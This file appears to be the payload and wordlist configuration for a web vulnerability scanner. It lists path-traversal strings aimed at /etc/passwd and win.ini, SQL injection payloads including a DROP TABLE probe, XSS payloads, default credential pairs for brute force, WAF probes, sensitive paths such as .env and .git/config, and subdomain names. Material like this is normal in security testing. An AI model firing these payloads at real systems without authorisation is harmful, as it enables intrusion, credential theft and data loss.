#  LFI / Path Traversal

LFI_PAYLOADS = [
    # ── Basic ────────────────────────────────────────────────
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    # ── URL encoded ─────────────────────────────────────────
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    # ── Double encoded ───────────────────────────────────────
    "%252e%252e%252fetc%252fpasswd",
    # ── Windows ─────────────────────────────────────────────
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    # ── Null byte ────────────────────────────────────────────
    "../../../../etc/passwd%00",
    # ── PHP wrappers ─────────────────────────────────────────
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    # ── Log files ────────────────────────────────────────────
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    # ── Bypass techniques ────────────────────────────────────
    "....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%c0%af..%c0%afetc/passwd",
]

LFI_COMMON_PARAMS = [
    "file", "page", "include", "path",
    "template", "view", "doc", "folder",
]


#  SQL Injection

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' --",
    "' #",
    "';--",
]

SQLI_BOOLEAN_PAYLOADS = [
    ("' OR '1'='1' --", "' OR '1'='2' --"),
    ("' OR 1=1 --",     "' OR 1=2 --"),
    ("1' OR '1'='1",    "1' OR '1'='2"),
]

SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' OR pg_sleep(5) --",
    "' OR 1=1; SELECT SLEEP(5) --",
]

SQLI_ERROR_SIGNATURES = [
    "sql syntax",
    "mysql",
    "syntax error",
    "warning",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc",
    "postgresql",
    "oracle",
    "sqlite",
    "mssql",
    "microsoft ole db",
    "invalid query",
    "division by zero",
    "supplied argument is not a valid",
    "pg_query",
    "pg_exec",
]

#  XSS

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert("xss")</script>',
    "'><script>alert('xss')</script>",
    '<img src=x onerror=alert("xss")>',
    '"><img src=x onerror=alert("xss")>',
    '<svg onload=alert("xss")>',
    'javascript:alert("xss")',
    '"><svg onload=alert("xss")>',
]

XSS_DOM_PAYLOADS = [
    '#<script>alert("xss")</script>',
    '#"><img src=x onerror=alert("xss")>',
    '#<svg onload=alert("xss")>',
]

#  Brute Force

BRUTEFORCE_WORDLIST = [
    ("admin",         "admin"),
    ("admin",         "password"),
    ("admin",         "123456"),
    ("admin",         "admin123"),
    ("admin",         "letmein"),
    ("root",          "root"),
    ("root",          "toor"),
    ("root",          "password"),
    ("user",          "user"),
    ("user",          "password"),
    ("test",          "test"),
    ("test",          "password"),
    ("guest",         "guest"),
    ("admin",         "qwerty"),
    ("administrator", "administrator"),
    ("administrator", "password"),
]

BRUTEFORCE_LOGIN_KEYWORDS = (
    "login", "signin", "sign-in", "auth", "account", "session", "wp-login"
)

#  WAF Detection

WAF_HEADERS = {
    "x-sucuri-id":           None,
    "x-sucuri-cache":        None,
    "x-firewall-protection": None,
    "server":                "cloudflare",
    "x-cdn":                 "imperva",
    "x-iinfo":               None,
    "x-protected-by":        None,
    "x-waf-event-info":      None,
    "x-amzn-waf-action":     None,
    "x-azure-ref":           None,
    "cf-ray":                None,
}

WAF_PROBE_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "UNION SELECT NULL,NULL,NULL--",
    "; DROP TABLE users--",
]

WAF_BLOCK_CODES = {403, 406, 429, 503, 501}

#  File Exposure

SENSITIVE_PATHS = [
    # ── Env & config ─────────────────────────────────────────
    "/.env", "/.env.local", "/.env.backup",
    "/config.php", "/config.yml", "/config.json",
    "/settings.py", "/settings.php",
    "/database.yml", "/db.php",
    # ── Admin panels ─────────────────────────────────────────
    "/admin", "/admin/", "/admin.php",
    "/administrator", "/phpmyadmin", "/wp-admin",
    # ── Backups ──────────────────────────────────────────────
    "/backup.zip", "/backup.sql", "/backup.tar.gz",
    # ── Git & server files ───────────────────────────────────
    "/.git/config", "/.git/HEAD",
    "/.htaccess", "/.htpasswd",
    # ── Logs & debug ─────────────────────────────────────────
    "/error.log", "/debug.log", "/php_errors.log",
    "/phpinfo.php", "/info.php",
    # ── Public info ──────────────────────────────────────────
    "/robots.txt", "/sitemap.xml",
    "/README.md", "/LICENSE",
]

FILE_FALSE_POSITIVE_KEYWORDS = [
    "not found",
    "404",
    "page not found",
    "error 404",
    "does not exist",
]

#  Subdomain Enumeration

SUBDOMAINS = [
    "www", "mail", "ftp", "admin", "blog", "dev", "test", "staging",
    "api", "shop", "store", "portal", "dashboard", "app", "mobile",
    "cdn", "static", "assets", "media", "images", "img", "upload",
    "uploads", "download", "downloads", "files", "backup", "old",
    "new", "beta", "alpha", "demo", "support", "help", "docs",
    "documentation", "wiki", "forum", "forums", "community", "chat",
    "vpn", "remote", "ssh", "ftp", "sftp", "smtp", "pop", "imap",
    "webmail", "email", "mx", "ns1", "ns2", "dns", "server",
    "web", "web1", "web2", "host", "hosting", "cloud", "secure",
    "ssl", "login", "auth", "sso", "oauth", "pay", "payment",
    "billing", "invoice", "crm", "erp", "hr", "git", "gitlab",
    "github", "jenkins", "ci", "jira", "confluence", "monitor",
    "status", "health", "metrics", "analytics", "tracking", "stats",
    "db", "database", "mysql", "postgres", "mongo", "redis", "elastic",
    "search", "internal", "intranet", "private", "secret", "hidden",
]

SUBDOMAIN_HIGH_RISK = {
    "admin", "dev", "test", "staging", "beta", "internal",
    "intranet", "private", "secret", "hidden", "db",
    "database", "git", "jenkins", "ci", "backup", "old",
}